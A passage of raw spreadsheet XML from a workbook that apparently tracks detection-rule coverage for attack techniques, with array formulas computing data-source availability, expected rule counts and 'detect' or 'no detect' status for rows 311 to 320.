        <v>1</v>
      </c>
      <c r="H311" s="9" t="str" cm="1">
        <f t="array" ref="H311">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I311" s="9" t="str" cm="1">
        <f t="array" ref="I311">IF(SUM(IF($C311=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C311=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J311" s="9" t="str" cm="1">
        <f t="array" ref="J31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11" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M311" s="9" cm="1">
        <f t="array" ref="M311">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N311" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O311" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P311" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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11" t="s">
        <v>368</v>
      </c>
      <c r="U311" t="s">
        <v>1599</v>
      </c>
      <c r="V311" t="s">
        <v>1600</v>
      </c>
      <c r="W311" t="b">
        <v>1</v>
      </c>
      <c r="X311" t="s">
        <v>1589</v>
      </c>
    </row>
    <row r="312" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A312" t="s">
        <v>1589</v>
      </c>
      <c r="B312" t="s">
        <v>1601</v>
      </c>
      <c r="C312" t="s">
        <v>1602</v>
      </c>
      <c r="D312" t="s">
        <v>1590</v>
      </c>
      <c r="E312" t="s">
        <v>434</v>
      </c>
      <c r="F312" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G312" s="9" cm="1">
        <f t="array" ref="G312">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H312" s="9" t="str" cm="1">
        <f t="array" ref="H312">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I312" s="9" t="str" cm="1">
        <f t="array" ref="I312">IF(SUM(IF($C312=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C312=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J312" s="9" t="str" cm="1">
        <f t="array" ref="J31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12" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M312" s="9" cm="1">
        <f t="array" ref="M312">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N312" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O312" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P312" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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12" t="s">
        <v>368</v>
      </c>
      <c r="U312" t="s">
        <v>1603</v>
      </c>
      <c r="V312" t="s">
        <v>1604</v>
      </c>
      <c r="W312" t="b">
        <v>1</v>
      </c>
      <c r="X312" t="s">
        <v>1589</v>
      </c>
    </row>
    <row r="313" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A313" t="s">
        <v>1605</v>
      </c>
      <c r="B313" t="s">
        <v>1605</v>
      </c>
      <c r="C313" t="s">
        <v>141</v>
      </c>
      <c r="D313" t="s">
        <v>13</v>
      </c>
      <c r="E313" t="s">
        <v>1606</v>
      </c>
      <c r="F313" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G313" s="9" cm="1">
        <f t="array" ref="G313">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H313" s="9" cm="1">
        <f t="array" ref="H313">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I313" s="9" t="str" cm="1">
        <f t="array" ref="I313">IF(SUM(IF($C313=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C313=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J313" s="9" cm="1">
        <f t="array" ref="J31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313" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M313" s="9" cm="1">
        <f t="array" ref="M313">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N313" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O313" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P313" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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13" t="s">
        <v>1334</v>
      </c>
      <c r="U313" t="s">
        <v>1607</v>
      </c>
      <c r="V313" t="s">
        <v>1608</v>
      </c>
      <c r="W313" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="314" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A314" t="s">
        <v>1605</v>
      </c>
      <c r="B314" t="s">
        <v>1609</v>
      </c>
      <c r="C314" t="s">
        <v>1610</v>
      </c>
      <c r="D314" t="s">
        <v>13</v>
      </c>
      <c r="E314" t="s">
        <v>1606</v>
      </c>
      <c r="F314" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G314" s="9" cm="1">
        <f t="array" ref="G314">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H314" s="9" t="str" cm="1">
        <f t="array" ref="H314">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I314" s="9" t="str" cm="1">
        <f t="array" ref="I314">IF(SUM(IF($C314=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C314=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J314" s="9" t="str" cm="1">
        <f t="array" ref="J31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14" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M314" s="9" cm="1">
        <f t="array" ref="M314">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N314" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O314" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P314" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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14" t="s">
        <v>485</v>
      </c>
      <c r="U314" t="s">
        <v>1611</v>
      </c>
      <c r="V314" t="s">
        <v>1612</v>
      </c>
      <c r="W314" t="b">
        <v>1</v>
      </c>
      <c r="X314" t="s">
        <v>1605</v>
      </c>
    </row>
    <row r="315" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A315" t="s">
        <v>1605</v>
      </c>
      <c r="B315" t="s">
        <v>1613</v>
      </c>
      <c r="C315" t="s">
        <v>1614</v>
      </c>
      <c r="D315" t="s">
        <v>13</v>
      </c>
      <c r="E315" t="s">
        <v>1606</v>
      </c>
      <c r="F315" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G315" s="9" cm="1">
        <f t="array" ref="G315">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H315" s="9" t="str" cm="1">
        <f t="array" ref="H315">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I315" s="9" t="str" cm="1">
        <f t="array" ref="I315">IF(SUM(IF($C315=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C315=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J315" s="9" t="str" cm="1">
        <f t="array" ref="J31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15" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M315" s="9" cm="1">
        <f t="array" ref="M315">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N315" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O315" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P315" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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15" t="s">
        <v>485</v>
      </c>
      <c r="U315" t="s">
        <v>1615</v>
      </c>
      <c r="V315" t="s">
        <v>1616</v>
      </c>
      <c r="W315" t="b">
        <v>1</v>
      </c>
      <c r="X315" t="s">
        <v>1605</v>
      </c>
    </row>
    <row r="316" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A316" t="s">
        <v>1617</v>
      </c>
      <c r="B316" t="s">
        <v>1617</v>
      </c>
      <c r="C316" t="s">
        <v>101</v>
      </c>
      <c r="D316" t="s">
        <v>13</v>
      </c>
      <c r="E316" t="s">
        <v>1618</v>
      </c>
      <c r="F316" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G316" s="9" cm="1">
        <f t="array" ref="G316">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H316" s="9" cm="1">
        <f t="array" ref="H316">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I316" s="9" t="str" cm="1">
        <f t="array" ref="I316">IF(SUM(IF($C316=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C316=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J316" s="9" cm="1">
        <f t="array" ref="J31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316" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M316" s="9" cm="1">
        <f t="array" ref="M316">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N316" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O316" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P316" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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16" t="s">
        <v>1334</v>
      </c>
      <c r="U316" t="s">
        <v>1619</v>
      </c>
      <c r="V316" t="s">
        <v>1620</v>
      </c>
      <c r="W316" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="317" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A317" t="s">
        <v>1617</v>
      </c>
      <c r="B317" t="s">
        <v>1621</v>
      </c>
      <c r="C317" t="s">
        <v>1622</v>
      </c>
      <c r="D317" t="s">
        <v>13</v>
      </c>
      <c r="E317" t="s">
        <v>1623</v>
      </c>
      <c r="F317" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G317" s="9" cm="1">
        <f t="array" ref="G317">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H317" s="9" t="str" cm="1">
        <f t="array" ref="H317">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I317" s="9" t="str" cm="1">
        <f t="array" ref="I317">IF(SUM(IF($C317=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C317=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J317" s="9" t="str" cm="1">
        <f t="array" ref="J31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17" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M317" s="9" cm="1">
        <f t="array" ref="M317">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N317" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O317" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P317" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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17" t="s">
        <v>368</v>
      </c>
      <c r="U317" t="s">
        <v>1624</v>
      </c>
      <c r="V317" t="s">
        <v>1625</v>
      </c>
      <c r="W317" t="b">
        <v>1</v>
      </c>
      <c r="X317" t="s">
        <v>1617</v>
      </c>
    </row>
    <row r="318" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A318" t="s">
        <v>1617</v>
      </c>
      <c r="B318" t="s">
        <v>1626</v>
      </c>
      <c r="C318" t="s">
        <v>1627</v>
      </c>
      <c r="D318" t="s">
        <v>13</v>
      </c>
      <c r="E318" t="s">
        <v>1618</v>
      </c>
      <c r="F318" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G318" s="9" cm="1">
        <f t="array" ref="G318">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H318" s="9" t="str" cm="1">
        <f t="array" ref="H318">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I318" s="9" t="str" cm="1">
        <f t="array" ref="I318">IF(SUM(IF($C318=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C318=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J318" s="9" t="str" cm="1">
        <f t="array" ref="J31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18" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M318" s="9" cm="1">
        <f t="array" ref="M318">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N318" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O318" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P318" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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18" t="s">
        <v>485</v>
      </c>
      <c r="U318" t="s">
        <v>1628</v>
      </c>
      <c r="V318" t="s">
        <v>1620</v>
      </c>
      <c r="W318" t="b">
        <v>1</v>
      </c>
      <c r="X318" t="s">
        <v>1617</v>
      </c>
    </row>
    <row r="319" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A319" t="s">
        <v>1617</v>
      </c>
      <c r="B319" t="s">
        <v>1629</v>
      </c>
      <c r="C319" t="s">
        <v>1630</v>
      </c>
      <c r="D319" t="s">
        <v>13</v>
      </c>
      <c r="E319" t="s">
        <v>1618</v>
      </c>
      <c r="F319" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G319" s="9" cm="1">
        <f t="array" ref="G319">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H319" s="9" t="str" cm="1">
        <f t="array" ref="H319">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I319" s="9" t="str" cm="1">
        <f t="array" ref="I319">IF(SUM(IF($C319=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C319=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J319" s="9" t="str" cm="1">
        <f t="array" ref="J31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19" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M319" s="9" cm="1">
        <f t="array" ref="M319">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N319" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O319" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P319" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S31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19" t="s">
        <v>485</v>
      </c>
      <c r="U319" t="s">
        <v>1631</v>
      </c>
      <c r="V319" t="s">
        <v>1632</v>
      </c>
      <c r="W319" t="b">
        <v>1</v>
      </c>
      <c r="X319" t="s">
        <v>1617</v>
      </c>
    </row>
    <row r="320" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A320" t="s">
        <v>1617</v>
      </c>
      <c r="B320" t="s">
        <v>1633</v>
      </c>
      <c r="C320" t="s">
        <v>1634</v>
      </c>
      <c r="D320" t="s">
        <v>13</v>
      </c>
      <c r="E320" t="s">
        <v>1618</v>
      </c>
      <c r="F320" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G320" s="9" cm="1">
        <f t="array" ref="G320">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H320" s="9" t="str" cm="1">
        <f t="array" ref="H320">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I320" s="9" t="str" cm="1">
        <f t="array" ref="I320">IF(SUM(IF($C320=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C320=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J320" s="9" t="str" cm="1">
        <f t="array" ref="J32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20" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M320" s="9" cm="1">
